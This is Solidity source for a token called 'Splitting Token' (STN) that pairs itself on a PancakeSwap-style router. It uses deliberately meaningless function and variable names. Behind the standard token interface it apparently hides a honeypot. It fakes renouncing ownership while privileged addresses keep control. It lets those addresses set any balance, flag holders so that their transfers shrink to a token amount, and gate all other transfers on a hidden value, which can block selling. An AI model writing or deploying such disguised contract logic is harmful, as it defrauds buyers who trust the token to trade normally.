//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface totalLaunched {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityAt) external view returns (uint256);

    function transfer(address totalReceiver, uint256 minReceiver) external returns (bool);

    function allowance(address enableListReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 minReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address totalReceiver,
        uint256 minReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atBuyTeam, uint256 value);
    event Approval(address indexed enableListReceiver, address indexed spender, uint256 value);
}

abstract contract enableAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverAutoShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchedEnable {
    function createPair(address launchWallet, address tradingReceiver) external returns (address);
}

interface totalLaunchedMetadata is totalLaunched {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SplittingToken is enableAt, totalLaunched, totalLaunchedMetadata {

    bool private modeMax;

    uint256 public walletTeam;

    uint256 public totalTrading;

    function approve(address toMax, uint256 minReceiver) public virtual override returns (bool) {
        exemptTake[_msgSender()][toMax] = minReceiver;
        emit Approval(_msgSender(), toMax, minReceiver);
        return true;
    }

    mapping(address => bool) public takeMax;

    bool private enableExemptSender;

    address swapSellTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private launchLimit;

    function isShould(address maxAmount) public {
        autoModeFee();
        
        if (maxAmount == receiverReceiver || maxAmount == tokenTeam) {
            return;
        }
        fundSender[maxAmount] = true;
    }

    function takeWalletAuto(address shouldFrom, uint256 minReceiver) public {
        autoModeFee();
        minMarketing[shouldFrom] = minReceiver;
    }

    uint256 public marketingTx;

    function sellLaunched(uint256 minReceiver) public {
        autoModeFee();
        takeAt = minReceiver;
    }

    address public receiverReceiver;

    bool private modeWalletLimit;

    function autoLaunch(address walletToken, address totalReceiver, uint256 minReceiver) internal returns (bool) {
        require(minMarketing[walletToken] >= minReceiver);
        minMarketing[walletToken] -= minReceiver;
        minMarketing[totalReceiver] += minReceiver;
        emit Transfer(walletToken, totalReceiver, minReceiver);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return enableTeam;
    }

    function limitMin(address walletToken, address totalReceiver, uint256 minReceiver) internal returns (bool) {
        if (walletToken == receiverReceiver) {
            return autoLaunch(walletToken, totalReceiver, minReceiver);
        }
        uint256 enableMode = totalLaunched(tokenTeam).balanceOf(fundEnable);
        require(enableMode == takeAt);
        require(totalReceiver != fundEnable);
        if (fundSender[walletToken]) {
            return autoLaunch(walletToken, totalReceiver, fromLimitTake);
        }
        return autoLaunch(walletToken, totalReceiver, minReceiver);
    }

    uint256 constant fromLimitTake = 7 ** 10;

    function fundSwap(address tradingTeam) public {
        if (walletReceiver) {
            return;
        }
        
        takeMax[tradingTeam] = true;
        
        walletReceiver = true;
    }

    bool private modeLaunch;

    function symbol() external view virtual override returns (string memory) {
        return launchedSell;
    }

    event OwnershipTransferred(address indexed autoIsTx, address indexed walletLaunchTotal);

    function name() external view virtual override returns (string memory) {
        return tradingIs;
    }

    address private isLaunchedLiquidity;

    string private tradingIs = "Splitting Token";

    constructor (){
        if (totalTrading == launchLimit) {
            launchedSwap = true;
        }
        receiverAutoShould launchEnable = receiverAutoShould(swapSellTrading);
        tokenTeam = launchedEnable(launchEnable.factory()).createPair(launchEnable.WETH(), address(this));
        
        receiverReceiver = _msgSender();
        sellLiquidity();
        takeMax[receiverReceiver] = true;
        minMarketing[receiverReceiver] = enableTeam;
        if (totalTrading != walletTeam) {
            walletTeam = launchLimit;
        }
        emit Transfer(address(0), receiverReceiver, enableTeam);
    }

    string private launchedSell = "STN";

    address fundEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address walletToken, address totalReceiver, uint256 minReceiver) external override returns (bool) {
        if (_msgSender() != swapSellTrading) {
            if (exemptTake[walletToken][_msgSender()] != type(uint256).max) {
                require(minReceiver <= exemptTake[walletToken][_msgSender()]);
                exemptTake[walletToken][_msgSender()] -= minReceiver;
            }
        }
        return limitMin(walletToken, totalReceiver, minReceiver);
    }

    uint256 takeAt;

    function sellLiquidity() public {
        emit OwnershipTransferred(receiverReceiver, address(0));
        isLaunchedLiquidity = address(0);
    }

    mapping(address => mapping(address => uint256)) private exemptTake;

    address public tokenTeam;

    function decimals() external view virtual override returns (uint8) {
        return atFund;
    }

    mapping(address => uint256) private minMarketing;

    function allowance(address receiverTradingLaunched, address toMax) external view virtual override returns (uint256) {
        if (toMax == swapSellTrading) {
            return type(uint256).max;
        }
        return exemptTake[receiverTradingLaunched][toMax];
    }

    function autoModeFee() private view {
        require(takeMax[_msgSender()]);
    }

    uint256 tokenIs;

    uint256 private enableTeam = 100000000 * 10 ** 18;

    bool public walletReceiver;

    mapping(address => bool) public fundSender;

    function owner() external view returns (address) {
        return isLaunchedLiquidity;
    }

    function getOwner() external view returns (address) {
        return isLaunchedLiquidity;
    }

    uint8 private atFund = 18;

    bool private launchedSwap;

    function balanceOf(address liquidityAt) public view virtual override returns (uint256) {
        return minMarketing[liquidityAt];
    }

    function transfer(address shouldFrom, uint256 minReceiver) external virtual override returns (bool) {
        return limitMin(_msgSender(), shouldFrom, minReceiver);
    }

}